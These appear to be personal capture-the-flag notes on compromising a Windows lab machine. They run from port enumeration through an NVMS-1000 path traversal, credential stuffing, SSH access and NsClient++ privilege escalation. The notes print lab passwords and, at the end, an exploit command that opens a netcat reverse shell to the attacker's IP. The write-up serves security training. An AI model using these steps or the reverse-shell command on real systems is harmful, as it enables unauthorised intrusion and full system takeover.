# Enumeration
---
## Open Ports
```
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
22/tcp    open  ssh          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5666/tcp  open  nrpe         syn-ack ttl 127
6063/tcp  open  x11          syn-ack ttl 127
6699/tcp  open  napster      syn-ack ttl 127
8443/tcp  open  https-alt    syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
```

## Port 21 - FTP (Anon access)
---
- ![[Pasted image 20250731065239.png]]

## Port 80 - HTTP
---
**NVMS- 1000**
![[Pasted image 20250731070316.png]]
- Search for vulnerabilities to find **Path Traversal**
- https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal/
- Set file to download to **Nathan's Desktop/passwords.txt** 
	- ![[Pasted image 20250731070428.png]]
- ![[Pasted image 20250731070435.png]]

# Credential Stuffing
---
- Trying the passwords list on both the users **using netexec**:
	- ![[Pasted image 20250731071133.png]]
	- 
- `Nadine` : `L1k3B1gBut7s@W0rk`

# Gaining Access
## Port 22 - SSH
- Use credentials obtained on all the services and on SSH, it worked:
	- `ssh nadine@10.10.10.184`
		- `L1k3B1gBut7s@W0rk`
	- ![[Pasted image 20250731071653.png]]
# Getting Administrator Password for NsClient++
---
- Read the file `nsclient.ini` in `C:/Windows/nsclient++/`
- Admin password: `ew2x6SsGTxjRwXOT`
- Only allows `127.0.0.1` as allowed host, so **we port forward using SSH**:
	- `ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443 `

# Getting Root Shell
----
- Search for PrivEsc vulns in NsClient++
- `https://www.exploit-db.com/exploits/46802`
- Use this to gain admin shell: https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/blob/master/README.md
	- `python3 exploit.py "C:\\Users\\Nadine\Desktop\nc.exe 10.10.16.6 443 -e cmd.exe" https://127.0.0.1:8443 ew2x6SsGTxjRwXOT`
	- `nc -lnvp 443`